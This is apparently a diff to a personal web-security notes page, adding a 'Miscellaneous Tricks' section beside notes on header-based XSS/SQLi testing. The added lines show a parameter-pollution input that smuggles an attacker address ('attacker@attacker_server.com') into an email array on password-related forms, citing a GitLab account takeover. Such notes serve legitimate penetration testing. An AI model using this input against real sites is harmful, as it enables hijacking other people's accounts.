@@ -32,6 +32,11 @@ pagetitle: Miscellaneous Web Notes
 	- `HTTP User-Agent` can sometimes be displayed in logging pages, so modifying it could XSS or SQLi some sites
 	- `Server` response can reveal info about server
 
+## Miscellaneous Tricks
+- On password registrations, modify the URL parameter to contain two emails to see what happens
+  - For example, change `email=test@test.com` to `email[]=test@test.com,attacker@attacker_server.com`
+  - This was the cause of a complete account takeover on gitlab
+
 ## Testing SAML
 - [https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/) - great blog post
 
